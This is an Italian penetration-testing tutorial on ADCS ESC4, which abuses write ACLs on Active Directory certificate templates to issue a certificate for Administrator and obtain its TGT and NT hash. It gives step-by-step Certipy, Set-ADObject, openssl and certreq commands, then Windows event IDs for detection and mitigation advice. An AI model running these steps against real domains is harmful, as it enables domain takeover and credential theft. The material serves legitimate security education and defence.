---
title: 'ESC4 ADCS Privilege Escalation: Template Hijacking con Certipy'
slug: esc4-adcs
description: 'ESC4 ADCS Privilege Escalation: sfruttare ACL deboli sui certificate template Active Directory per trasformarli in ESC1 e ottenere Domain Admin con Certipy.'
image: /BCO.9ce6ba52-ce57-472f-b167-52ab8931a51e.webp
draft: false
date: 2026-03-07T00:00:00.000Z
lastmod: 2026-06-23T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - 'privilege-escalation,esc4'
  - adcs
  - certipy
---

# ADCS ESC4: Privilege Escalation via Permessi sui Certificate Template

ESC4 è una tecnica di privilege escalation su Active Directory che sfrutta **permessi di scrittura su un certificate template**. I certificate template sono oggetti AD — se un attaccante ha i permessi per modificarli, può trasformare un template sicuro in uno vulnerabile (tipicamente ESC1) e ottenere certificati per qualsiasi utente del dominio, Administrator incluso.

I template vivono in AD sotto:

```
CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration
```

***

## Quando esiste ESC4

ESC4 è sfruttabile quando un utente (o un gruppo di cui fa parte) ha uno di questi permessi sull'oggetto template:

```
GenericAll / FullControl
WriteDACL
WriteOwner
WriteProperty
```

Questi permessi permettono di modificare attributi critici del template:

```
msPKI-Certificate-Name-Flag      → controlla ENROLLEE_SUPPLIES_SUBJECT
pKIExtendedKeyUsage              → gli EKU del certificato
msPKI-Certificate-Application-Policy → Application Policy (sovrascrive EKU)
msPKI-Enrollment-Flag            → manager approval, publish to DS
msPKI-RA-Signature               → authorized signatures required
nTSecurityDescriptor             → ACL dell'oggetto template
```

Con GenericAll puoi modificare tutti questi attributi in un colpo solo. Con WriteDACL o WriteProperty potresti dover lavorare attributo per attributo.

***

## Identificazione

### Da Kali con Certipy

```bash
certipy find -u attacker@corp.local -p 'Passw0rd!' -dc-ip 10.0.0.100 -vulnerable -stdout
```

Output tipico quando c'è ESC4:

```
Template Name                 : Web
[...]
Object Control Permissions
  Full Control Principals     : CORP\webdevelopers

[!] Vulnerabilities
  ESC4 : 'CORP\\webdevelopers' has dangerous permissions on the template
```

### Da Windows con Certify

```powershell
.\Certify.exe find
```

Nell'output cerca `Full Control Principals` o `WriteDACL Principals` con utenti non amministrativi. Se il tuo utente o un suo gruppo compare lì — hai ESC4.

### Con certutil nativo (LOLBin, zero rumore)

```powershell
certutil -catemplates
```

Se il template appare con `Auto-Enroll` invece di `Access is denied` — hai almeno enrollment rights, poi verifichi i permessi con Certify o BloodHound.

***

## Exploitation

L'attacco si divide in tre fasi: modificare il template, richiedere il certificato, autenticarsi.

***

### Metodo 1 — Certipy da Kali (hai credenziali)

**Step 1 — Modifica il template**

Certipy trasforma il template in ESC1 con un comando solo. Prima salva il backup della configurazione originale, poi applica la configurazione ESC1 di default:

```bash
# Certipy v5.x
certipy template \
  -u attacker@corp.local -p 'Passw0rd!' \
  -dc-ip 10.0.0.100 \
  -template NomeTemplate \
  -save-configuration NomeTemplate.json \
  -write-default-configuration
```

`-save-configuration` salva la config originale in JSON prima di modificare — fondamentale per il ripristino. `-write-default-configuration` applica la configurazione ESC1: abilita `ENROLLEE_SUPPLIES_SUBJECT`, aggiunge Client Authentication, apre enrollment a Authenticated Users e disabilita manager approval.

> Nota: nelle versioni certipy v4.x il flag di backup si chiamava `-save-old`. Da v5.x è stato rinominato in `-save-configuration <file>`.

**Step 2 — Richiedi il certificato**

```bash
certipy req \
  -u attacker@corp.local -p 'Passw0rd!' \
  -dc-ip 10.0.0.100 \
  -target ca.corp.local \
  -ca CORP-CA \
  -template NomeTemplate \
  -upn administrator@corp.local
```

Certipy genera direttamente il PFX — non serve passare per openssl.

**Step 3 — Autenticati**

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.100
```

Output:

```
[*] Got TGT
[*] Got NT hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:...
```

**Step 4 — Ripristina il template**

```bash
# Certipy v5.x
certipy template \
  -u attacker@corp.local -p 'Passw0rd!' \
  -dc-ip 10.0.0.100 \
  -template NomeTemplate \
  -write-configuration NomeTemplate.json
```

Il template torna esattamente com'era prima. In un engagement reale è obbligatorio.

***

### Metodo 2 — PowerShell da Windows (hai shell sull'host)

Questo metodo è quello giusto quando `certipy find -vulnerable` o `Certify.exe find /vulnerable` **non trovano nulla** — ma tu sai da BloodHound o dall'output di Certify che hai GenericAll, WriteDACL o WriteProperty sul template.

Perché succede? Certipy e Certify cercano template già misconfigured di default. Se il template è configurato correttamente ma tu hai i permessi per modificarlo, non lo segnalano come vulnerabile — perché non lo è ancora. Sei tu che lo rendi tale.

Quindi il workflow è: BloodHound mostra GenericAll su un `CertTemplate` → `certutil -catemplates` mostra che hai Auto-Enroll su quel template → il template non è ESC1 ma tu puoi renderlo tale → usi questo metodo.

Usa `Set-ADObject` e `certreq`, entrambi nativi Windows — zero tool aggiuntivi da caricare.

**Step 1 — Aggiungi gli EKU al template**

Il template di default ha solo Server Authentication — serve per i siti HTTPS ma non permette di autenticarsi come utente AD. Con GenericAll puoi aggiungere i due OID che trasformano il template in ESC1:

```powershell
$EKUs = @("1.3.6.1.5.5.7.3.2", "1.3.6.1.4.1.311.20.2.2")
Set-ADObject "CN=NomeTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=dominio,DC=htb" `
  -Add @{pKIExtendedKeyUsage=$EKUs;"msPKI-Certificate-Application-Policy"=$EKUs}
```

`1.3.6.1.5.5.7.3.2` è Client Authentication — permette al certificato di essere usato per autenticarsi verso il DC via PKINIT. `1.3.6.1.4.1.311.20.2.2` è Smart Card Logon — richiesto da molti DC per supportare PKINIT correttamente. Si aggiungono sempre in coppia. Il DN completo del template lo trovi nell'output di Certify o BloodHound sotto `Distinguished Name`. Per capire cosa fa ogni OID, vedi la [guida agli EKU OID in ADCS](https://hackita.it/articoli/adcs-eku-oid-offensive/).

Verifica che la modifica sia andata a buon fine:

```powershell
.\Certify.exe find /template:NomeTemplate
# pkiextendedkeyusage: Client Authentication, Server Authentication, Smart Card Logon
```

**Step 2 — Genera la cert request da Kali**

Da Kali si genera una **chiave privata** e una **cert request**. La chiave rimane da parte tua — non la mandi mai alla CA. La request dice alla CA: "voglio un certificato, ecco la mia chiave pubblica, e il certificato deve essere intestato a `administrator@dominio.htb`" — questo è possibile perché il template ha `ENROLLEE_SUPPLIES_SUBJECT`.

```bash
cat > admin.cnf << EOF
[ req ]
default_bits = 2048
prompt = no
req_extensions = user
distinguished_name = dn

[ dn ]
CN = Administrator

[ user ]
subjectAltName = otherName:msUPN;UTF8:administrator@dominio.htb
EOF

openssl req -config admin.cnf \
  -subj "/DC=htb/DC=dominio/CN=Users/CN=Administrator" \
  -new -nodes -sha256 -out administrator.req -keyout administrator.key
```

Genera due file: `administrator.key` (tieni privata) e `administrator.req` (da mandare alla CA).

**Step 3 — Fai firmare la request dalla CA**

Si carica `administrator.req` sulla macchina Windows e si sottomette alla CA con `certreq` — nativo Windows, zero tool aggiuntivi. La CA verifica che il template esista, che tu abbia enrollment rights, e firma il certificato:

```powershell
certreq -submit -config "earth.dominio.htb\NOME-CA" `
  -attrib "CertificateTemplate:NomeTemplate" administrator.req administrator.cer
# Certificate retrieved(Issued)
```

`administrator.cer` è il certificato firmato dalla CA — pubblico, intestato ad Administrator, con Client Auth e Smart Card Logon come EKU.

**Step 4 — Crea il PFX e autenticati**

`certipy auth` per autenticarsi ha bisogno di cert + chiave privata insieme. Il formato PFX li contiene entrambi in un file solo:

```bash
openssl pkcs12 -export -in administrator.cer -inkey administrator.key -out administrator.pfx
```

Quindi `administrator.req` → CA → `administrator.cer` (pubblico) + `administrator.key` (privato) → `administrator.pfx` (entrambi). Poi certipy usa il PFX per fare PKINIT e ottenere TGT + NT hash:

```bash
certipy auth -pfx administrator.pfx -dc-ip <IP_DC>
# [*] Got TGT
# [*] Got NT hash for 'administrator': aad3b435b51404eeaad3b435b51404ee:...
```

**Step 5 — Ripristina il template**

```powershell
Set-ADObject "CN=NomeTemplate,CN=Certificate Templates,..." `
  -Remove @{pKIExtendedKeyUsage=$EKUs;"msPKI-Certificate-Application-Policy"=$EKUs}
```

***

## Confronto metodi

|                              | Certipy (Kali)   | PowerShell (Windows)              |
| ---------------------------- | ---------------- | --------------------------------- |
| Richiede credenziali         | Sì               | No (usa contesto utente corrente) |
| Richiede tool aggiuntivi     | Certipy          | Solo modulo AD nativo             |
| Backup automatico config     | Sì (`-save-old`) | No — salva manualmente prima      |
| Genera PFX direttamente      | Sì               | No — serve openssl separato       |
| Funziona senza shell Windows | Sì               | No                                |

***

## Limite importante

ESC4 funziona **solo se il template è già pubblicato sulla CA**. Se il template esiste in AD ma non è abilitato sulla CA, la `certreq` fallirà. In quel caso serve ESC7 per abilitarlo.

***

## Detection

**Event ID 5136** — A directory service object was modified. Si genera quando vengono modificati gli attributi del template (`pKIExtendedKeyUsage`, `msPKI-Certificate-Application-Policy`) da parte di un account non in un gruppo PKI amministrativo. È la detection più efficace per ESC4.

**Event ID 4887** — Certificate issued. Se il SAN del certificato emesso non corrisponde all'account richiedente → alert.

**Event ID 4768** con `PreAuthType=16` — autenticazione PKINIT da un account privilegiato in modo insolito.

***

## Mitigation

Solo `Enterprise Admins` e gruppi PKI dedicati devono avere permessi di scrittura sui template. Si verifica con:

```bash
certipy find -vulnerable
```

oppure con BloodHound cercando edge `GenericAll`, `WriteDACL`, `WriteOwner` verso nodi `CertTemplate`.

Audit periodico degli ACL su `CN=Certificate Templates` e disabilitazione dei template legacy non utilizzati riducono drasticamente la superficie d'attacco.

***

## FAQ

**ESC4 modifica la CA?**
No — modifica solo l'oggetto template in AD. La CA non viene toccata.

**Se ho solo WriteDACL posso fare ESC4?**
Sì — con WriteDACL puoi prima darti GenericAll e poi procedere come sopra.

**Devo ripristinare il template?**
In produzione sì, sempre. Il template modificato con Client Auth + ENROLLEE\_SUPPLIES\_SUBJECT diventa sfruttabile da qualsiasi utente autenticato nel dominio.

**Certipy `find -vulnerable` non mostra ESC4. Perché?**
Potrebbe non avere visibilità completa sugli ACL. Verifica con Certify da Windows o con una query LDAP diretta sugli attributi di sicurezza del template.

***

## Risorse correlate

* [EKU OID in ADCS: guida offensiva completa — hackita.it](https://hackita.it/articoli/adcs-eku-oid-offensive/)
* [Attacchi ADCS ESC1–ESC16 — hackita.it](https://hackita.it/articoli/adcs-esc1-esc16/)
* [Certipy — GitHub](https://github.com/ly4k/Certipy)
* [Certified Pre-Owned — SpecterOps](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
